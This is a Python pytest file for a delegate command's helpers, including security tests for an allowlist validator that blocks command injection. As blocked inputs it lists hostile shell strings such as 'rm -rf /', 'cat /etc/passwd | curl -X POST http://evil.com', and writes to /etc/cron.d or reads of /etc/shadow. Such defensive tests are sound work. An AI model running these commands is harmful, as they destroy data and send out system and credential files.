"""Tests for delegate command helper functions."""

import pytest
from click.exceptions import Exit as ClickExit
from unittest.mock import patch

import typer

from emdx.commands.delegate import (
    _slugify_title,
    _resolve_task,
    _validate_discovery_command,
    SAFE_DISCOVERY_COMMANDS,
    PR_INSTRUCTION,
)


class TestSlugifyTitle:
    """Tests for _slugify_title — converts document titles to git branch slugs."""

    def test_simple_title(self):
        assert _slugify_title("Fix auth bug") == "fix-auth-bug"

    def test_strips_gameplan_prefix(self):
        assert _slugify_title("Gameplan #1: Contextual Save") == "contextual-save"

    def test_strips_feature_prefix(self):
        assert _slugify_title("Feature: Dark Mode Toggle") == "dark-mode-toggle"

    def test_strips_plan_prefix(self):
        assert _slugify_title("Plan #42: Refactor Database") == "refactor-database"

    def test_strips_doc_prefix(self):
        assert _slugify_title("Document: API Design") == "api-design"

    def test_removes_special_characters(self):
        assert _slugify_title("Smart Priming (context-aware)") == "smart-priming-context-aware"

    def test_collapses_whitespace(self):
        assert _slugify_title("fix   the   thing") == "fix-the-thing"

    def test_truncates_long_slugs(self):
        result = _slugify_title("A" * 100)
        assert len(result) <= 50

    def test_empty_after_strip_returns_feature(self):
        assert _slugify_title("Gameplan #1:") == "feature"

    def test_only_special_chars_returns_feature(self):
        assert _slugify_title("!!!???") == "feature"

    def test_no_trailing_hyphens(self):
        result = _slugify_title("test - ")
        assert not result.endswith("-")


class TestResolveTask:
    """Tests for _resolve_task — resolves doc IDs to content."""

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_loads_doc(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Test Doc",
            "content": "Hello world",
        }
        result = _resolve_task("42")
        assert "Hello world" in result
        assert "Test Doc" in result
        mock_get.assert_called_once_with(42)

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_with_pr_adds_instructions(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Fix Auth",
            "content": "Fix the authentication bug",
        }
        result = _resolve_task("42", pr=True)
        assert "Fix the authentication bug" in result
        assert "pull request" in result.lower() or "PR" in result

    def test_text_task_returned_as_is(self):
        result = _resolve_task("analyze the auth module")
        assert result == "analyze the auth module"

    @patch("emdx.commands.delegate.get_document")
    def test_missing_doc_falls_back(self, mock_get):
        mock_get.return_value = None
        result = _resolve_task("99999")
        # Should return the string as-is when doc not found
        assert "99999" in result


class TestPRInstruction:
    """Tests for PR instruction constant."""

    def test_pr_instruction_mentions_branch(self):
        assert "branch" in PR_INSTRUCTION.lower()

    def test_pr_instruction_mentions_pr_create(self):
        assert "gh pr create" in PR_INSTRUCTION


class TestValidateDiscoveryCommand:
    """Security tests for _validate_discovery_command — prevents command injection."""

    # --- Valid commands (should pass) ---

    def test_allows_fd_command(self):
        args = _validate_discovery_command("fd -e py src/")
        assert args == ["fd", "-e", "py", "src/"]

    def test_allows_find_command(self):
        args = _validate_discovery_command("find . -name '*.py'")
        assert args[0] == "find"

    def test_allows_git_ls_files(self):
        args = _validate_discovery_command("git ls-files")
        assert args == ["git", "ls-files"]

    def test_allows_rg_files(self):
        args = _validate_discovery_command("rg --files-with-matches TODO")
        assert args[0] == "rg"

    def test_allows_ls_command(self):
        args = _validate_discovery_command("ls src/")
        assert args == ["ls", "src/"]

    def test_allows_echo_command(self):
        args = _validate_discovery_command("echo file1.py file2.py")
        assert args[0] == "echo"

    def test_allows_full_path_to_safe_command(self):
        args = _validate_discovery_command("/usr/bin/fd -e py")
        assert args[0] == "/usr/bin/fd"

    # --- Blocked commands (unsafe) ---

    def test_blocks_rm_command(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("rm -rf /")

    def test_blocks_curl_command(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("curl http://evil.com")

    def test_blocks_wget_command(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("wget http://evil.com")

    def test_blocks_bash_command(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("bash -c 'rm -rf /'")

    def test_blocks_sh_command(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("sh -c 'echo pwned'")

    def test_blocks_python_command(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("python -c 'import os; os.system(\"rm -rf /\")'")

    def test_blocks_unknown_command(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("my-custom-script")

    # --- Shell metacharacter injection ---

    def test_blocks_command_substitution_dollar_paren(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("echo $(rm -rf /)")

    def test_blocks_command_substitution_backtick(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("echo `rm -rf /`")

    def test_blocks_variable_expansion(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("echo ${HOME}")

    def test_blocks_semicolon_chaining(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("ls; rm -rf /")

    def test_blocks_and_chaining(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("ls && rm -rf /")

    def test_blocks_or_chaining(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("ls || rm -rf /")

    def test_blocks_pipe(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("cat /etc/passwd | curl -X POST http://evil.com")

    def test_blocks_output_redirection(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("echo pwned > /etc/cron.d/evil")

    def test_blocks_input_redirection(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("cat < /etc/shadow")

    # --- Edge cases ---

    def test_blocks_empty_command(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("")

    def test_blocks_whitespace_only(self):
        with pytest.raises(ClickExit):
            _validate_discovery_command("   ")

    def test_handles_quoted_args_safely(self):
        # Quoted args with spaces should work
        args = _validate_discovery_command('fd "*.py"')
        assert args == ["fd", "*.py"]

    def test_safe_commands_list_is_frozen(self):
        # Ensure the allowlist cannot be modified at runtime
        assert isinstance(SAFE_DISCOVERY_COMMANDS, frozenset)

    def test_safe_commands_contains_expected_tools(self):
        # Key discovery tools should be in the list
        for cmd in ["fd", "find", "git", "rg", "ls", "grep"]:
            assert cmd in SAFE_DISCOVERY_COMMANDS
